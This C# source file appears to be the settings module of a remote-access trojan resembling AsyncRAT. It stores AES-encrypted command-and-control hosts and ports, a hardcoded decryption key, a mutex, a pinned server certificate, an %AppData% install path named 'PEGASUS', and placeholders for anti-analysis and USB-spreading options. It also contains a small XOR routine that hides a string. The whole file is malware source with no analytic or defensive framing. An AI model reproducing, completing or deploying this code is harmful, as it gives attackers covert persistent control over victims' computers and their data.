using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Peg.ICARUS;

namespace Peg
{
	public static class Settings
	{
		public static string Por_ts = "IlqFRm9kpu0lTrg/HZB6/fLiF3Wuu18j0kBkcT2Rl+pM+wn35AXcj0qXP47/xO/BZFRWyhVTEzfMK/AN34PxTw==";

		public static string Hos_ts = "ROLuQ2lQr2MYNN/JuLde6gNKNB3w4PUP3+pj9CnlWNhicenKAezZcskA5PPvdnMiYTA5qOW1QJCy+CkzOyAQkQ==";

		public static string Ver_sion = "+jAuOIugiuitJMH21g7lTZoRoFfGEOzqxKPAJ3paPFFy3r3hzX/TJH3oWxtlCltqqyqsXI7hrC3YDZ8HHyQN8A==";

		public static string Egkatastash = "DmdiBRp2gf2ivWf0bFWPeiThhElNzoKy3GWyBs27zbI56EkbGnSLa1ni7lsgooiBOQ5IC770VpzuClcUggQPQw==";

		public static string Install_Folder = "%AppData%";

		public static string Install_File = "PEGASUS";

		public static string Key = "a2llNEFpNEwzRlBtbkcwM05kVGhUOXo5TkdPRmRjM2k=";

		public static string MTX = "pBLsHJ98Wvw/XlkLwORrIbirbmT8xwHnsJZ3DtYaPiwWeEJI21/x9B9GhgLzCQ1Kd074RDru+FZ3klXBy8baPqaKm8Q0lqAcDHIEpYbWlex9IK+ZzJsjP4hsX48hu+EsyV12ccUavXbIBla8PUNwtQ==";

		public static string Certifi_cate = "5/dYFxKtAJVCCE7BDuk0R2fkZumlagOQPC9QnH9zyz04HUA9zD0NiHeWEU8+MM/Ccopz+YuD5F0p8mLQpsOL9fvtTcKbacYXg/KYHOa8GXinJpMkLIeSJ370Z0aXhRs97g2KX1jywifEZFhfr898XDsUrcqrphEmfNk/D96XjbSip4ueMnmkJfemqy7ohbSF/H9MPwmZMVt6Ct2xgRNm+V945v0cTPBT2qoyriSE1la5pEjBgs6AHQs8uza9xfKTQOtv7jMNoOrUV61sXppwYca++cjX/vEq0b6cpAPxY/EoRwcOGC+Oz9YEKlldT6fFjWuMd5OTyxBWeiLPLarmIFALAJubU3IoYGFcK8RO9kaJgMzKa0W02WgDdbpYXxeysQG1bz5mBc3j/PuvcrrlTV2b9+g+A9GfC/DJVBtShH485SkKLyL1JNQA1/xqw1w/YaPg0FH5GsspiAQD4jS3ATUbDas3B4i+FK2HMQwL0mWKJZSbWyx5HT99TLn++xTdCdkSDbrwzktVu8jwE+HzWRSBAswWbsxFITBNLu4nFWd4Oai0+qtsfwEn/wR7hV1UZSoUoQoyIW7qcmXVpqeDq3HTpaihcsoMLGKafwhRrczmSjK9oW8urm/YdZCHJ0poh+U8hzq4HE6Zaj3Fw34UPqMbyeWKKC/1a6NcXHBMupulaVdg02mV+g7RpwImNZQ8IruUWzlIkX3G1l9t7ssQ4OK2EKrCVEj+vQ+Jubkk76SBlqj+cAPMlVr7VdTKZL3XKV2UMT6cgALZnjvN0buiaPssGWY7HSEWJopmnRMOHAhWewphujKMQiH1mksNyKX8WA8Noed4CFDEpJxicdpsoNukH+QkBm4r506pO73zvnlPNCMBTk45WVGg4M6vdOjFmVOSkLMYwQS844Yhti34GRjpnMV1X2vNE9XqWpLKyTZVtE1QtnmsoFZcfWmGbxENJG2aAOHefIvF5wTVhv5I8Qk+2+nDMHQGAu2T1ZFaPwKdcN5j7blHqSlEEvz6CKFxuE444ZLTBsmAOt7zts6kmkiaqo+J0Ta4HZZO1yLgajVJnY5CDVSgNMY/iHPU+d5l";

		public static string Server_signa_ture = "Vo48ZNtHr6/5kQh/DSBvRq8PqtHlBuwk/NNqzJ2rgeIGBKHYbFLaS7XeeHV2Jg8W3JYtoQ0D8kCYntkll8owDpS8/CsyJB+NB5lios8T3Qnf9TlQg7GwtPNkEESA1/ZbazVBRzA0kvQRbfi2Mob5nEJ6/wZ/2xc+3XZlNhfzextsx4/qy1CCxi3WTDCtmHao968uhwEbPFD3tOzfV8grbxRiHa51JwIkWVdUJWfr3wjmZxrfilgEZI6VEf4H3/oReWyaZCA1YFn7DslX15MYjO7u50y9RJ4QFuh62ac0Vpw=";

		public static X509Certificate2 Server_Certificate;

		public static Aetos aes256;

		public static string BinToGo = "BGGZAbvqWi1cMxhyqiGJ0Gxv3Kil5PYuHKYbhlA1Jku9H0wZYt6gzycBeDsmsflOPA+6/Pp7l3Ag1eR/KTjpkw==";

		public static string ODBS = "NvzUjRqhqTGQ8d58RVliqRT3Xt8LRKPBlvw6N2qUJA/DVfucduyB2qC9Xbtv23NuERZN6sy72dHzHyQ9aBa2EA==";

		public static string Hw_id;

		public static string De_lay = "1";

		public static string Group = "K7LwDz8urQaMKYCQoqD+nZgRHgigDY1I3xnNv1X4NKDX3qV71lrupA6TdcFaXZ/O4ag3LJlhhmQX7/69RYOc9A==";

		public static string ProstathsYlhs = "VHfgocXhA0ot8hjBVZ/9o7MxYKzdqCNDMSBNMf+USn3wWOPmbq+M0LRwEDEx/e+/hiuI6BPrmvyeU/2+soz03g==";

		public static string Prostaths = "giMHkBSnjYJ8UT/Oeg9Xs8amWFiUQDPBvpfJ1OgRwRIH8/LLnzDf+W+ToI7Xfs7IuBSNjJLKqrMm24njXtZBNQ==";

		public static string Aspida = "%Aspida%";

		public static string AlphaOmega = "%AlphaOmega%";

		public static string PProstaths = "%Prostaths%";

		public static string USB = "%USB%";

		public static string Exclude = "%Exclude%";

		public static bool InitializeSettings()
		{
			try
			{
				Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
				aes256 = new Aetos(Key);
				Por_ts = aes256.Decrypt(Por_ts);
				Hos_ts = aes256.Decrypt(Hos_ts);
				Ver_sion = aes256.Decrypt(Ver_sion);
				Egkatastash = aes256.Decrypt(Egkatastash);
				MTX = aes256.Decrypt(MTX);
				BinToGo = aes256.Decrypt(BinToGo);
				Prostaths = aes256.Decrypt(Prostaths);
				ProstathsYlhs = aes256.Decrypt(ProstathsYlhs);
				ODBS = aes256.Decrypt(ODBS);
				Group = aes256.Decrypt(Group);
				Hw_id = YlhSysthmatos.Ylh();
				Server_signa_ture = aes256.Decrypt(Server_signa_ture);
				Server_Certificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certifi_cate)));
				return VerifyHash();
			}
			catch
			{
				return false;
			}
		}

		private static bool VerifyHash()
		{
			try
			{
				RSACryptoServiceProvider rSACryptoServiceProvider = (RSACryptoServiceProvider)Server_Certificate.PublicKey.Key;
				using SHA256Managed sHA256Managed = new SHA256Managed();
				return rSACryptoServiceProvider.VerifyHash(sHA256Managed.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID(thebook("YBK8?<")), Convert.FromBase64String(Server_signa_ture));
			}
			catch (Exception)
			{
				return false;
			}
		}

		public static string thebook(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				char value = (char)(array[i] ^ c);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
	}
}
